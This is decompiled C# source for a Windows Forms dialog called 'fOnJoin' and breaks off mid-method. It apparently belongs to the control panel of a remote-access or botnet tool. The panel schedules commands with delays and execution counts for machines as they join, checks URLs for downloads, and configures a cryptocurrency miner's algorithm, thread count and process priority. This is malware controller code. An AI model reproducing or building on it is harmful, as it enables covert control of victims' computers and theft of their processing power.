﻿using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x020000E6 RID: 230
[DesignerGenerated]
public sealed partial class fOnJoin : Form
{
	// Token: 0x06000AD7 RID: 2775 RVA: 0x0000704F File Offset: 0x0000524F
	public fOnJoin()
	{
		base.Load += this.fOnJoin_Load;
		base.Closing += this.fOnJoin_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06000ADA RID: 2778 RVA: 0x00007081 File Offset: 0x00005281
	internal TabPage vmethod_0()
	{
		return this.tabPage_0;
	}

	// Token: 0x06000ADB RID: 2779 RVA: 0x00007089 File Offset: 0x00005289
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(TabPage tabPage_6)
	{
		this.tabPage_0 = tabPage_6;
	}

	// Token: 0x06000ADC RID: 2780 RVA: 0x00007092 File Offset: 0x00005292
	internal TabPage vmethod_2()
	{
		return this.tabPage_1;
	}

	// Token: 0x06000ADD RID: 2781 RVA: 0x0000709A File Offset: 0x0000529A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(TabPage tabPage_6)
	{
		this.tabPage_1 = tabPage_6;
	}

	// Token: 0x06000ADE RID: 2782 RVA: 0x000070A3 File Offset: 0x000052A3
	internal TabPage vmethod_4()
	{
		return this.tabPage_2;
	}

	// Token: 0x06000ADF RID: 2783 RVA: 0x00056F24 File Offset: 0x00055124
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(TabPage tabPage_6)
	{
		EventHandler value = new EventHandler(this.method_18);
		TabPage tabPage = this.tabPage_2;
		if (tabPage != null)
		{
			tabPage.Click -= value;
		}
		this.tabPage_2 = tabPage_6;
		tabPage = this.tabPage_2;
		if (tabPage != null)
		{
			tabPage.Click += value;
		}
	}

	// Token: 0x06000AE0 RID: 2784 RVA: 0x000070AB File Offset: 0x000052AB
	internal TabControl vmethod_6()
	{
		return this.tabControl_0;
	}

	// Token: 0x06000AE1 RID: 2785 RVA: 0x000070B3 File Offset: 0x000052B3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(TabControl tabControl_1)
	{
		this.tabControl_0 = tabControl_1;
	}

	// Token: 0x06000AE2 RID: 2786 RVA: 0x000070BC File Offset: 0x000052BC
	internal GClass7 vmethod_8()
	{
		return this.gclass7_0;
	}

	// Token: 0x06000AE3 RID: 2787 RVA: 0x000070C4 File Offset: 0x000052C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(GClass7 gclass7_1)
	{
		this.gclass7_0 = gclass7_1;
	}

	// Token: 0x06000AE4 RID: 2788 RVA: 0x000070CD File Offset: 0x000052CD
	internal Label vmethod_10()
	{
		return this.label_0;
	}

	// Token: 0x06000AE5 RID: 2789 RVA: 0x000070D5 File Offset: 0x000052D5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(Label label_10)
	{
		this.label_0 = label_10;
	}

	// Token: 0x06000AE6 RID: 2790 RVA: 0x000070DE File Offset: 0x000052DE
	internal TextBox vmethod_12()
	{
		return this.textBox_0;
	}

	// Token: 0x06000AE7 RID: 2791 RVA: 0x000070E6 File Offset: 0x000052E6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(TextBox textBox_6)
	{
		this.textBox_0 = textBox_6;
	}

	// Token: 0x06000AE8 RID: 2792 RVA: 0x000070EF File Offset: 0x000052EF
	internal CheckBox vmethod_14()
	{
		return this.checkBox_0;
	}

	// Token: 0x06000AE9 RID: 2793 RVA: 0x000070F7 File Offset: 0x000052F7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(CheckBox checkBox_5)
	{
		this.checkBox_0 = checkBox_5;
	}

	// Token: 0x06000AEA RID: 2794 RVA: 0x00007100 File Offset: 0x00005300
	internal VisualButton vmethod_16()
	{
		return this.visualButton_0;
	}

	// Token: 0x06000AEB RID: 2795 RVA: 0x00056F68 File Offset: 0x00055168
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(VisualButton visualButton_6)
	{
		EventHandler value = new EventHandler(this.method_0);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_6;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000AEC RID: 2796 RVA: 0x00007108 File Offset: 0x00005308
	internal VisualButton vmethod_18()
	{
		return this.visualButton_1;
	}

	// Token: 0x06000AED RID: 2797 RVA: 0x00056FAC File Offset: 0x000551AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(VisualButton visualButton_6)
	{
		EventHandler value = new EventHandler(this.method_1);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_6;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000AEE RID: 2798 RVA: 0x00007110 File Offset: 0x00005310
	internal VisualButton vmethod_20()
	{
		return this.visualButton_2;
	}

	// Token: 0x06000AEF RID: 2799 RVA: 0x00056FF0 File Offset: 0x000551F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(VisualButton visualButton_6)
	{
		EventHandler value = new EventHandler(this.method_14);
		VisualButton visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_2 = visualButton_6;
		visualButton = this.visualButton_2;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000AF0 RID: 2800 RVA: 0x00007118 File Offset: 0x00005318
	internal PictureBox vmethod_22()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06000AF1 RID: 2801 RVA: 0x00057034 File Offset: 0x00055234
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_2);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_2;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000AF2 RID: 2802 RVA: 0x00007120 File Offset: 0x00005320
	internal PictureBox vmethod_24()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06000AF3 RID: 2803 RVA: 0x00057078 File Offset: 0x00055278
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_3);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_2;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06000AF4 RID: 2804 RVA: 0x00007128 File Offset: 0x00005328
	internal CheckBox vmethod_26()
	{
		return this.checkBox_1;
	}

	// Token: 0x06000AF5 RID: 2805 RVA: 0x00007130 File Offset: 0x00005330
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(CheckBox checkBox_5)
	{
		this.checkBox_1 = checkBox_5;
	}

	// Token: 0x06000AF6 RID: 2806 RVA: 0x00007139 File Offset: 0x00005339
	internal TextBox vmethod_28()
	{
		return this.textBox_1;
	}

	// Token: 0x06000AF7 RID: 2807 RVA: 0x000570BC File Offset: 0x000552BC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(TextBox textBox_6)
	{
		EventHandler value = new EventHandler(this.method_6);
		EventHandler value2 = new EventHandler(this.method_7);
		TextBox textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.LostFocus -= value;
			textBox.GotFocus -= value2;
		}
		this.textBox_1 = textBox_6;
		textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.LostFocus += value;
			textBox.GotFocus += value2;
		}
	}

	// Token: 0x06000AF8 RID: 2808 RVA: 0x00007141 File Offset: 0x00005341
	internal Label vmethod_30()
	{
		return this.label_1;
	}

	// Token: 0x06000AF9 RID: 2809 RVA: 0x00007149 File Offset: 0x00005349
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(Label label_10)
	{
		this.label_1 = label_10;
	}

	// Token: 0x06000AFA RID: 2810 RVA: 0x00007152 File Offset: 0x00005352
	internal CheckBox vmethod_32()
	{
		return this.checkBox_2;
	}

	// Token: 0x06000AFB RID: 2811 RVA: 0x0000715A File Offset: 0x0000535A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(CheckBox checkBox_5)
	{
		this.checkBox_2 = checkBox_5;
	}

	// Token: 0x06000AFC RID: 2812 RVA: 0x00007163 File Offset: 0x00005363
	internal TextBox vmethod_34()
	{
		return this.textBox_2;
	}

	// Token: 0x06000AFD RID: 2813 RVA: 0x0005711C File Offset: 0x0005531C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(TextBox textBox_6)
	{
		EventHandler value = new EventHandler(this.method_4);
		EventHandler value2 = new EventHandler(this.method_5);
		TextBox textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
		}
		this.textBox_2 = textBox_6;
		textBox = this.textBox_2;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
		}
	}

	// Token: 0x06000AFE RID: 2814 RVA: 0x0000716B File Offset: 0x0000536B
	internal Label vmethod_36()
	{
		return this.label_2;
	}

	// Token: 0x06000AFF RID: 2815 RVA: 0x00007173 File Offset: 0x00005373
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(Label label_10)
	{
		this.label_2 = label_10;
	}

	// Token: 0x06000B00 RID: 2816 RVA: 0x0000717C File Offset: 0x0000537C
	internal ComboBox vmethod_38()
	{
		return this.comboBox_0;
	}

	// Token: 0x06000B01 RID: 2817 RVA: 0x00007184 File Offset: 0x00005384
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(ComboBox comboBox_4)
	{
		this.comboBox_0 = comboBox_4;
	}

	// Token: 0x06000B02 RID: 2818 RVA: 0x0000718D File Offset: 0x0000538D
	internal Label vmethod_40()
	{
		return this.label_3;
	}

	// Token: 0x06000B03 RID: 2819 RVA: 0x00007195 File Offset: 0x00005395
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(Label label_10)
	{
		this.label_3 = label_10;
	}

	// Token: 0x06000B04 RID: 2820 RVA: 0x0000719E File Offset: 0x0000539E
	internal CheckBox vmethod_42()
	{
		return this.checkBox_3;
	}

	// Token: 0x06000B05 RID: 2821 RVA: 0x000071A6 File Offset: 0x000053A6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(CheckBox checkBox_5)
	{
		this.checkBox_3 = checkBox_5;
	}

	// Token: 0x06000B06 RID: 2822 RVA: 0x000071AF File Offset: 0x000053AF
	internal ComboBox vmethod_44()
	{
		return this.comboBox_1;
	}

	// Token: 0x06000B07 RID: 2823 RVA: 0x000071B7 File Offset: 0x000053B7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(ComboBox comboBox_4)
	{
		this.comboBox_1 = comboBox_4;
	}

	// Token: 0x06000B08 RID: 2824 RVA: 0x000071C0 File Offset: 0x000053C0
	internal Label vmethod_46()
	{
		return this.label_4;
	}

	// Token: 0x06000B09 RID: 2825 RVA: 0x000071C8 File Offset: 0x000053C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(Label label_10)
	{
		this.label_4 = label_10;
	}

	// Token: 0x06000B0A RID: 2826 RVA: 0x000071D1 File Offset: 0x000053D1
	internal TextBox vmethod_48()
	{
		return this.textBox_3;
	}

	// Token: 0x06000B0B RID: 2827 RVA: 0x0005717C File Offset: 0x0005537C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(TextBox textBox_6)
	{
		EventHandler value = new EventHandler(this.method_10);
		EventHandler value2 = new EventHandler(this.method_11);
		TextBox textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.LostFocus -= value;
			textBox.GotFocus -= value2;
		}
		this.textBox_3 = textBox_6;
		textBox = this.textBox_3;
		if (textBox != null)
		{
			textBox.LostFocus += value;
			textBox.GotFocus += value2;
		}
	}

	// Token: 0x06000B0C RID: 2828 RVA: 0x000071D9 File Offset: 0x000053D9
	internal Label vmethod_50()
	{
		return this.label_5;
	}

	// Token: 0x06000B0D RID: 2829 RVA: 0x000071E1 File Offset: 0x000053E1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(Label label_10)
	{
		this.label_5 = label_10;
	}

	// Token: 0x06000B0E RID: 2830 RVA: 0x000071EA File Offset: 0x000053EA
	internal CheckBox vmethod_52()
	{
		return this.checkBox_4;
	}

	// Token: 0x06000B0F RID: 2831 RVA: 0x000071F2 File Offset: 0x000053F2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(CheckBox checkBox_5)
	{
		this.checkBox_4 = checkBox_5;
	}

	// Token: 0x06000B10 RID: 2832 RVA: 0x000071FB File Offset: 0x000053FB
	internal ComboBox vmethod_54()
	{
		return this.comboBox_2;
	}

	// Token: 0x06000B11 RID: 2833 RVA: 0x00007203 File Offset: 0x00005403
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(ComboBox comboBox_4)
	{
		this.comboBox_2 = comboBox_4;
	}

	// Token: 0x06000B12 RID: 2834 RVA: 0x0000720C File Offset: 0x0000540C
	internal Label vmethod_56()
	{
		return this.label_6;
	}

	// Token: 0x06000B13 RID: 2835 RVA: 0x00007214 File Offset: 0x00005414
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(Label label_10)
	{
		this.label_6 = label_10;
	}

	// Token: 0x06000B14 RID: 2836 RVA: 0x0000721D File Offset: 0x0000541D
	internal ComboBox vmethod_58()
	{
		return this.comboBox_3;
	}

	// Token: 0x06000B15 RID: 2837 RVA: 0x00007225 File Offset: 0x00005425
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ComboBox comboBox_4)
	{
		this.comboBox_3 = comboBox_4;
	}

	// Token: 0x06000B16 RID: 2838 RVA: 0x0000722E File Offset: 0x0000542E
	internal Label vmethod_60()
	{
		return this.label_7;
	}

	// Token: 0x06000B17 RID: 2839 RVA: 0x00007236 File Offset: 0x00005436
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(Label label_10)
	{
		this.label_7 = label_10;
	}

	// Token: 0x06000B18 RID: 2840 RVA: 0x0000723F File Offset: 0x0000543F
	internal TextBox vmethod_62()
	{
		return this.textBox_4;
	}

	// Token: 0x06000B19 RID: 2841 RVA: 0x000571DC File Offset: 0x000553DC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(TextBox textBox_6)
	{
		EventHandler value = new EventHandler(this.method_12);
		EventHandler value2 = new EventHandler(this.method_13);
		TextBox textBox = this.textBox_4;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
		}
		this.textBox_4 = textBox_6;
		textBox = this.textBox_4;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
		}
	}

	// Token: 0x06000B1A RID: 2842 RVA: 0x00007247 File Offset: 0x00005447
	internal Label vmethod_64()
	{
		return this.label_8;
	}

	// Token: 0x06000B1B RID: 2843 RVA: 0x0000724F File Offset: 0x0000544F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(Label label_10)
	{
		this.label_8 = label_10;
	}

	// Token: 0x06000B1C RID: 2844 RVA: 0x00007258 File Offset: 0x00005458
	internal TextBox vmethod_66()
	{
		return this.textBox_5;
	}

	// Token: 0x06000B1D RID: 2845 RVA: 0x0005723C File Offset: 0x0005543C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(TextBox textBox_6)
	{
		EventHandler value = new EventHandler(this.method_8);
		EventHandler value2 = new EventHandler(this.method_9);
		TextBox textBox = this.textBox_5;
		if (textBox != null)
		{
			textBox.GotFocus -= value;
			textBox.LostFocus -= value2;
		}
		this.textBox_5 = textBox_6;
		textBox = this.textBox_5;
		if (textBox != null)
		{
			textBox.GotFocus += value;
			textBox.LostFocus += value2;
		}
	}

	// Token: 0x06000B1E RID: 2846 RVA: 0x00007260 File Offset: 0x00005460
	internal Label vmethod_68()
	{
		return this.label_9;
	}

	// Token: 0x06000B1F RID: 2847 RVA: 0x00007268 File Offset: 0x00005468
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(Label label_10)
	{
		this.label_9 = label_10;
	}

	// Token: 0x06000B20 RID: 2848 RVA: 0x00007271 File Offset: 0x00005471
	internal ContextMenuStrip vmethod_70()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06000B21 RID: 2849 RVA: 0x00007279 File Offset: 0x00005479
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06000B22 RID: 2850 RVA: 0x00007282 File Offset: 0x00005482
	internal ToolStripMenuItem vmethod_72()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x06000B23 RID: 2851 RVA: 0x0005729C File Offset: 0x0005549C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_15);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_0 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000B24 RID: 2852 RVA: 0x0000728A File Offset: 0x0000548A
	internal ToolStripSeparator vmethod_74()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x06000B25 RID: 2853 RVA: 0x00007292 File Offset: 0x00005492
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(ToolStripSeparator toolStripSeparator_2)
	{
		this.toolStripSeparator_0 = toolStripSeparator_2;
	}

	// Token: 0x06000B26 RID: 2854 RVA: 0x0000729B File Offset: 0x0000549B
	internal ToolStripMenuItem vmethod_76()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x06000B27 RID: 2855 RVA: 0x000072A3 File Offset: 0x000054A3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(ToolStripMenuItem toolStripMenuItem_5)
	{
		this.toolStripMenuItem_1 = toolStripMenuItem_5;
	}

	// Token: 0x06000B28 RID: 2856 RVA: 0x000072AC File Offset: 0x000054AC
	internal ToolStripMenuItem vmethod_78()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06000B29 RID: 2857 RVA: 0x000572E0 File Offset: 0x000554E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_16);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000B2A RID: 2858 RVA: 0x000072B4 File Offset: 0x000054B4
	internal ToolStripSeparator vmethod_80()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x06000B2B RID: 2859 RVA: 0x000072BC File Offset: 0x000054BC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(ToolStripSeparator toolStripSeparator_2)
	{
		this.toolStripSeparator_1 = toolStripSeparator_2;
	}

	// Token: 0x06000B2C RID: 2860 RVA: 0x000072C5 File Offset: 0x000054C5
	internal ToolStripMenuItem vmethod_82()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x06000B2D RID: 2861 RVA: 0x00057324 File Offset: 0x00055524
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_17);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000B2E RID: 2862 RVA: 0x000072CD File Offset: 0x000054CD
	internal TabPage vmethod_84()
	{
		return this.tabPage_3;
	}

	// Token: 0x06000B2F RID: 2863 RVA: 0x000072D5 File Offset: 0x000054D5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(TabPage tabPage_6)
	{
		this.tabPage_3 = tabPage_6;
	}

	// Token: 0x06000B30 RID: 2864 RVA: 0x000072DE File Offset: 0x000054DE
	internal VisualButton vmethod_86()
	{
		return this.visualButton_3;
	}

	// Token: 0x06000B31 RID: 2865 RVA: 0x00057368 File Offset: 0x00055568
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(VisualButton visualButton_6)
	{
		EventHandler value = new EventHandler(this.method_19);
		VisualButton visualButton = this.visualButton_3;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_3 = visualButton_6;
		visualButton = this.visualButton_3;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000B32 RID: 2866 RVA: 0x000072E6 File Offset: 0x000054E6
	internal ToolStripMenuItem vmethod_88()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x06000B33 RID: 2867 RVA: 0x000573AC File Offset: 0x000555AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(ToolStripMenuItem toolStripMenuItem_5)
	{
		EventHandler value = new EventHandler(this.method_21);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_5;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000B34 RID: 2868 RVA: 0x000072EE File Offset: 0x000054EE
	internal TabPage vmethod_90()
	{
		return this.tabPage_4;
	}

	// Token: 0x06000B35 RID: 2869 RVA: 0x000072F6 File Offset: 0x000054F6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(TabPage tabPage_6)
	{
		this.tabPage_4 = tabPage_6;
	}

	// Token: 0x06000B36 RID: 2870 RVA: 0x000072FF File Offset: 0x000054FF
	internal VisualButton vmethod_92()
	{
		return this.visualButton_4;
	}

	// Token: 0x06000B37 RID: 2871 RVA: 0x000573F0 File Offset: 0x000555F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(VisualButton visualButton_6)
	{
		EventHandler value = new EventHandler(this.method_22);
		VisualButton visualButton = this.visualButton_4;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_4 = visualButton_6;
		visualButton = this.visualButton_4;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000B38 RID: 2872 RVA: 0x00007307 File Offset: 0x00005507
	internal TabPage vmethod_94()
	{
		return this.tabPage_5;
	}

	// Token: 0x06000B39 RID: 2873 RVA: 0x0000730F File Offset: 0x0000550F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(TabPage tabPage_6)
	{
		this.tabPage_5 = tabPage_6;
	}

	// Token: 0x06000B3A RID: 2874 RVA: 0x00007318 File Offset: 0x00005518
	internal VisualButton vmethod_96()
	{
		return this.visualButton_5;
	}

	// Token: 0x06000B3B RID: 2875 RVA: 0x00057434 File Offset: 0x00055634
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(VisualButton visualButton_6)
	{
		EventHandler value = new EventHandler(this.method_23);
		VisualButton visualButton = this.visualButton_5;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_5 = visualButton_6;
		visualButton = this.visualButton_5;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000B3C RID: 2876 RVA: 0x00057478 File Offset: 0x00055678
	private void fOnJoin_Load(object sender, EventArgs e)
	{
		this.vmethod_8().Columns.Add("cmd", "Command");
		this.vmethod_8().Columns[0].Width = 160;
		this.vmethod_8().Columns.Add("params", "Parameters");
		this.vmethod_8().Columns[1].Width = 475;
		this.vmethod_8().Columns.Add("delay", "Delay (min)");
		this.vmethod_8().Columns[2].Width = 120;
		this.vmethod_8().Columns.Add("execs", "Executions");
		this.vmethod_8().Columns[3].Width = 100;
		this.vmethod_8().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_58().Items.Add("cn/r");
		this.vmethod_58().Items.Add("rx/0");
		this.vmethod_58().Items.Add("argon2/chukwa");
		this.vmethod_58().Items.Add("argon2/wrkz");
		this.vmethod_58().Items.Add("rx/wow");
		this.vmethod_58().Items.Add("rx/loki");
		this.vmethod_58().Items.Add("cn/fast");
		this.vmethod_58().Items.Add("cn/rwz");
		this.vmethod_58().Items.Add("cn/zls");
		this.vmethod_58().Items.Add("cn/double");
		this.vmethod_58().Items.Add("cn/wow");
		this.vmethod_58().Items.Add("cn/gpu");
		this.vmethod_58().Items.Add("cn-pico");
		this.vmethod_58().Items.Add("cn/half");
		this.vmethod_58().Items.Add("cn/2");
		this.vmethod_58().Items.Add("cn/xao");
		this.vmethod_58().Items.Add("cn/rto");
		this.vmethod_58().Items.Add("cn-heavy/tube");
		this.vmethod_58().Items.Add("cn-heavy/xhv");
		this.vmethod_58().Items.Add("cn-heavy/0");
		this.vmethod_58().Items.Add("cn/1");
		this.vmethod_58().Items.Add("cn-lite/1");
		this.vmethod_58().Items.Add("cn-lite/0");
		this.vmethod_58().Items.Add("cn/0");
		this.vmethod_58().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_58().Items[0]);
		this.vmethod_54().Items.Add("Auto");
		int num = 1;
		checked
		{
			do
			{
				this.vmethod_54().Items.Add(num);
				num++;
			}
			while (num <= 128);
			this.vmethod_54().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_54().Items[0]);
			this.vmethod_44().Items.Add("Default");
			int num2 = 1;
			do
			{
				this.vmethod_44().Items.Add(num2);
				num2++;
			}
			while (num2 <= 99);
			this.vmethod_44().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_44().Items[0]);
			this.vmethod_38().Items.Add("Realtime");
			this.vmethod_38().Items.Add("High");
			this.vmethod_38().Items.Add("Above normal");
			this.vmethod_38().Items.Add("Normal");
			this.vmethod_38().Items.Add("Below normal");
			this.vmethod_38().Items.Add("Low");
			this.vmethod_38().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_38().Items[3]);
			try
			{
				if (Class135.smethod_0().OnJoinCommands != null)
				{
					try
					{
						foreach (object obj in Class135.smethod_0().OnJoinCommands)
						{
							string[] array = Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(obj)), "|", 4, CompareMethod.Text);
							ListViewItem listViewItem = new ListViewItem();
							listViewItem.Text = array[0];
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							listViewItem.SubItems.Add("0");
							listViewItem.Tag = array[3];
							this.vmethod_8().Items.Add(listViewItem);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000B3D RID: 2877 RVA: 0x000579E0 File Offset: 0x00055BE0
	private void method_0(object sender, EventArgs e)
	{
		int num = (Operators.CompareString(this.vmethod_12().Text, string.Empty, true) == 0 | this.vmethod_12().TextLength > 2048) ? 1 : 0;
		TextBox textBox;
		string text = (textBox = this.vmethod_12()).Text;
		ref string ptr = ref text;
		int num2 = num;
		bool flag = false & Strings.LCase(ptr).StartsWith("https");
		if (ptr.ToLower().StartsWith("www."))
		{
			ptr = "http://" + ptr;
		}
		bool flag2 = Regex.IsMatch(ptr, "http(s)?://([\\w+?\\.\\w+])+([a-zA-Z0-9\\~\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)_\\-\\=\\+\\\\\\/\\?\\.\\:\\;\\'\\,]*)?");
		bool flag3 = flag2;
		bool flag4 = num2 != 0;
		int num3 = flag3 ? 1 : 0;
		textBox.Text = text;
		if (flag4 | num3 == 0)
		{
			Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text2 = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
		if (!Versioned.IsNumeric(text2) | Conversion.Val(text2) > 1440.0)
		{
